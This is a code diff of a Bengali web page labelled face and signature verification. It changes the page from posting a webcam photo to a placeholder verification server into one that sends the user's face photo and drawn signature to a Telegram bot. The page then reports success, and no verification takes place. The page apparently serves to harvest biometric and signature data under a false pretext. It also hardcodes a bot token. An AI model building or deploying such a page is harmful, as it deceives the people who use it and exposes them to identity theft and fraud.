@@ -2,142 +2,102 @@
 <html lang="bn">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>ফেস ভেরিফিকেশন</title>
+  <title>ফেস ও স্বাক্ষর ভেরিফিকেশন</title>
   <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #f1f3f5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-
-    .container {
-      background-color: #fff;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
-      max-width: 400px;
-      text-align: center;
-      width: 100%;
-    }
-
-    h1 {
-      margin-bottom: 20px;
-      color: #004085;
-    }
-
-    video, canvas {
-      width: 100%;
-      max-width: 320px;
-      border-radius: 10px;
-      border: 1px solid #ccc;
-      margin-bottom: 15px;
-    }
-
-    button {
-      background-color: #007bff;
-      color: #fff;
-      border: none;
-      padding: 12px 20px;
-      font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-      margin: 5px;
-    }
-
-    button:disabled {
-      background-color: #aaa;
-      cursor: not-allowed;
-    }
-
-    #result {
-      margin-top: 20px;
-      font-weight: bold;
-      font-size: 16px;
-    }
+    body { font-family: sans-serif; text-align: center; padding: 20px; }
+    video, canvas { width: 90%; max-width: 320px; margin-bottom: 15px; border: 1px solid #ccc; }
+    .signature { border: 1px dashed #000; height: 150px; }
+    button { padding: 10px 20px; margin: 10px; background: green; color: #fff; border: none; border-radius: 6px; }
   </style>
 </head>
 <body>
+  <h2>ফেস ও সিগনেচার যাচাই</h2>
+  
+  <video id="video" autoplay></video>
+  <canvas id="faceCanvas" width="320" height="240" style="display:none;"></canvas>
 
-  <div class="container">
-    <h1>ফেস ভেরিফিকেশন</h1>
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+  <h3>✍️ স্বাক্ষর করুন</h3>
+  <canvas id="signCanvas" class="signature" width="320" height="150"></canvas><br/>
 
-    <div>
-      <button id="captureBtn">📸 ছবি তুলুন</button>
-      <button id="sendBtn" disabled>📤 যাচাই করুন</button>
-    </div>
+  <button id="capture">📸 ফেস ক্যাপচার</button>
+  <button id="submit">✅ সাবমিট করুন</button>
 
-    <div id="result"></div>
-  </div>
+  <p id="result"></p>
 
   <script>
     const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    const captureBtn = document.getElementById('captureBtn');
-    const sendBtn = document.getElementById('sendBtn');
-    const resultDiv = document.getElementById('result');
-    let capturedImage = null;
+    const faceCanvas = document.getElementById('faceCanvas');
+    const faceCtx = faceCanvas.getContext('2d');
+    const signCanvas = document.getElementById('signCanvas');
+    const signCtx = signCanvas.getContext('2d');
+    const result = document.getElementById('result');
+
+    let faceImage = "";
+    let drawing = false;
 
     // ক্যামেরা চালু
     navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-      })
-      .catch(error => {
-        alert("❌ ক্যামেরা চালু করা যাচ্ছে না: " + error.message);
-        captureBtn.disabled = true;
-      });
+      .then(stream => { video.srcObject = stream; })
+      .catch(err => alert("ক্যামেরা চালু করা যাচ্ছে না: " + err));
 
-    // ছবি ক্যাপচার
-    captureBtn.addEventListener('click', () => {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      capturedImage = canvas.toDataURL('image/jpeg');
-      sendBtn.disabled = false;
-      resultDiv.textContent = ''; // কোনো মেসেজ দেখানো হবে না এখানে
-    });
+    // স্বাক্ষর আঁকা
+    signCanvas.addEventListener('mousedown', () => drawing = true);
+    signCanvas.addEventListener('mouseup', () => drawing = false);
+    signCanvas.addEventListener('mousemove', e => draw(e));
+    signCanvas.addEventListener('touchstart', e => { drawing = true; draw(e.touches[0]); });
+    signCanvas.addEventListener('touchend', () => drawing = false);
+    signCanvas.addEventListener('touchmove', e => { draw(e.touches[0]); e.preventDefault(); });
 
-    // যাচাই সাবমিট
-    sendBtn.addEventListener('click', () => {
-      if (!capturedImage) {
-        alert("⚠️ অনুগ্রহ করে ছবি তুলুন!");
-        return;
-      }
+    function draw(e) {
+      if (!drawing) return;
+      const rect = signCanvas.getBoundingClientRect();
+      signCtx.lineWidth = 2;
+      signCtx.strokeStyle = "black";
+      signCtx.lineTo(e.clientX - rect.left, e.clientY - rect.top);
+      signCtx.stroke();
+      signCtx.beginPath();
+      signCtx.moveTo(e.clientX - rect.left, e.clientY - rect.top);
+    }
 
-      resultDiv.style.color = "black";
-      resultDiv.textContent = "⏳ যাচাই করা হচ্ছে...";
-      sendBtn.disabled = true;
+    // ফেস ক্যাপচার
+    document.getElementById('capture').onclick = () => {
+      faceCtx.drawImage(video, 0, 0, faceCanvas.width, faceCanvas.height);
+      faceImage = faceCanvas.toDataURL("image/jpeg");
+      result.innerText = "✅ ফেস ক্যাপচার সম্পন্ন হয়েছে!";
+    };
 
-      fetch('https://your-server.com/verify', {
+    // টেলিগ্রাম বট এ পাঠানো
+    document.getElementById('submit').onclick = async () => {
+      if (!faceImage) return alert("⚠️ ফেস ক্যাপচার করেননি!");
+      const signImage = signCanvas.toDataURL("image/png");
+
+      const botToken = "7075083128:AAGNo5wBZ3Y7B7Lexp5U4_-XuO-kxQVYeQY";
+      const chatId = "YOUR_CHAT_ID"; // এখানে আপনার টেলিগ্রাম চ্যাট আইডি বসান
+
+      result.innerText = "📤 ডেটা পাঠানো হচ্ছে...";
+
+      // ফেস ছবি পাঠানো
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ image: capturedImage })
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.success || data.status === "ok") {
-          resultDiv.style.color = "green";
-          resultDiv.textContent = "✅ আপনার ফেস ভেরিফাই সফল হয়েছে ✅";
-        } else {
-          resultDiv.style.color = "red";
-          resultDiv.textContent = "❌ আপনার ফেস ভেরিফাই ব্যর্থ হয়েছে ❌";
-        }
-      })
-      .catch(error => {
-        resultDiv.style.color = "red";
-        resultDiv.textContent = "❌ ভেরিফিকেশন পাঠাতে সমস্যা: " + error.message;
-      })
-      .finally(() => {
-        sendBtn.disabled = false;
+        body: new URLSearchParams({
+          chat_id: chatId,
+          photo: faceImage,
+          caption: "✅ ফেস ভেরিফিকেশন ছবি"
+        })
       });
-    });
-  </script>
 
+      // সিগনেচার পাঠানো
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: new URLSearchParams({
+          chat_id: chatId,
+          photo: signImage,
+          caption: "🖊️ স্বাক্ষর"
+        })
+      });
+
+      result.innerText = "✅ আপনার ফেস ও স্বাক্ষর সফলভাবে পাঠানো হয়েছে!";
+    };
+  </script>
 </body>
 </html>
